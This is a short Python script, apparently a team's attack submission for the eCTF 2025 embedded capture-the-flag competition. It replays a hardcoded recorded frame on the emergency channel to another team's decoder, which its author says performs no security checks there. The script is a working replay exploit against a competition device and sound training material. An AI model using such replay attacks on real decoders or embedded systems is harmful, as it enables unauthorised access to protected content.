"""Pesky Neighbor attack for tufts
@author: Gavin Zhong, Liz Grzyb
@description: Liz - NYIT does not implement security checks on the emergency channel, here we replay a recorded frame from ch0.
"""

import time
import sys

# The ectf25 module comes pre-installed in the environment
from ectf25.utils.decoder import DecoderIntf

def lgmt_channel_0() -> bytes:
    """Gavin Zhong
        simply replay lgmt channel 0 frame
    """
    lgmt_frame_channel0 = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00r2\xdbg\xffY-\x01\x1c\xf4\x05\x00noflagonthischan^ flag ^0005f41c012d59ff^ time ^705b3b97ecdb6a32j<2\x1el\xfbJ\x1dC\x08HX\xbd\x1f\xaf\xd5\xc8(H\x1cp\xd1\xb2\x11\xfeG\x98\xafH\xcf\xdco'
    return lgmt_frame_channel0


if __name__ == '__main__':
    print("Running Pesky Neighbor attack")
    time.sleep(1)
    
    # The serial port string will be in argv[1]
    interface = DecoderIntf(sys.argv[1])
    # Replay lgmt channel 0 frame
    interface.decode(lgmt_channel_0())
    interface.decode(lgmt_channel_0())

    print("Done with pesky Neighbor attack")
